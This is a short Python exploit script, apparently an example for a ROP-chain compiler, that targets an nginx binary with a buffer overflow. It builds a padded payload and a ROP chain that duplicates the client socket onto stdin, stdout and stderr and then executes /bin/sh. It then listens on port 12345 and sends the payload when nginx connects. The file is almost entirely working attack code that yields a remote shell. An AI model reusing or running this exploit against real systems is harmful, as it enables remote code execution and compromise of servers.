import sys, logging, struct
from pwn import *
from rop_compiler import ropme, goal, gadget

files = [('./example/bkp/blah/nginx', './example/bkp/blah/nginx.gadgets', 0)] # Use stored gadgets file for quicker generation
goals = [
  ["function", "dup2", 7, 0], # socket fd 7 = client socket
  ["function", "dup2", 7, 1], # socket fd 7 = client socket
  ["function", "dup2", 7, 2], # socket fd 7 = client socket
  ["execve", "/bin/sh"]
]
rop = ropme.rop(files, [], goals, log_level = logging.DEBUG, strategy = gadget.FIRST)

# The exploit causes the 3rd overwritten qword to get corrupted, skip past it
skip_24_bytes_gadget = struct.pack("Q", 0x4035b2)
payload = "\x00" + (1063 * "A") + skip_24_bytes_gadget + ("B" * 8) + ("C" * 8)
payload += rop

# Setup a server to listen for nginx's connection
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind(("0.0.0.0", 12345))
server.listen(1)
client, address = server.accept()

# Once it connects, send it our payload
r = remote.fromsocket(client)
r.write(payload)
r.close()

